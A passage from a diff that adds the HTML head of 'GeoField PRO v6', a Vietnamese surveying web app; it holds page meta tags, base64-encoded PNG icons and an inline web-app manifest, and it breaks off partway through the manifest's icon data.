@@ -1,0 +1,1772 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+<title>GeoField PRO v6 · Tác giả John · Đo đạc, Nhập KML/DXF · VN-2000</title>
+<meta name="theme-color" content="#0f151c">
+<meta name="mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+<meta name="apple-mobile-web-app-title" content="GeoField">
+<link rel="apple-touch-icon" href="data:image/png;base64,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">
+<link rel="icon" href="data:image/png;base64,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">
+<link rel="manifest" href="data:application/manifest+json,%7B%22name%22%3A%22GeoField%20VN-2000%22%2C%22short_name%22%3A%22GeoField%22%2C%22start_url%22%3A%22.%22%2C%22display%22%3A%22standalone%22%2C%22background_color%22%3A%22%230f151c%22%2C%22theme_color%22%3A%22%230f151c%22%2C%22orientation%22%3A%22any%22%2C%22icons%22%3A%5B%7B%22src%22%3A%22data%3Aimage/png%3Bbase64%2CiVBORw0KGgoAAAANSUhEUgAAAgAAAAIACAYAAAD0eNT6AAAU1UlEQVR4nO3dTaobWbYGUNm4Xb4UGKrhgRTUZKrjUSUFbzIPciDZKEhInH2DXyOfbFmWrkIR52fvs9dqG99QKOJ8X%2Bw4vn5zopv3Hz5%2BnX0MAJn9%2Bftvb2Yfw6qc2IOEPMAcysExTt4ThD1AbErBdk7UKwQ%2BQG4KwX1OzAWBD7A2heC78idC6APUVL0MlP3wgh%2BA06luESj1oYU%2BAK%2BpVAZKfFDBD8AzKhSBpT%2Bg4AfgiJWLwJIfTPAD0NKKRWCpDyT4AehppSKwxAcR/ACMtEIRSP0BBD8AM2UuAm9nH8Bewh%2BA2TJnUbrmkvlkA7CubNOAVBMA4Q9AVNkyKkVbyXZSAagtwzQg/ARA%2BAOQTYbsCl0AMpxAALgleoaFHFFEP2kA8IyIrwTCTQCEPwCriZhtoQpAxBMEAC1Ey7gwBSDaiQGA1iJl3fR3EpFOBgCMMntfwNQJgPAHoKrZGTitAMz%2B4AAw28wsnFIAhD8A/GVWJg4vAMIfAH40IxuHFgDhDwC3jc7IYQVA%2BAPA60Zm5ZACIPwBYJtRmdm9AAh/AHjOiOwM85sAAYBxuhYAT/8AsE/vDO1WAIQ/ABzTM0u7FADhDwBt9MrU5gVA%2BANAWz2y1SZAACioaQHw9A8AfbTO2GYFQPgDQF8ts7ZJARD%2BADBGq8y1BwAACjpcADz9A8BYLbL3UAEQ/gAwx9EM9goAAAraXQA8/QPAXEeyeFcBEP4AEMPeTPYKAAAKeroAePoHgFj2ZLMJAAAU9FQB8PQPADE9m9EmAABQ0OYC4OkfAGJ7JqtNAACgoE0FwNM/AOSwNbNNAACgoIcFwNM/AOSyJbtNAACgo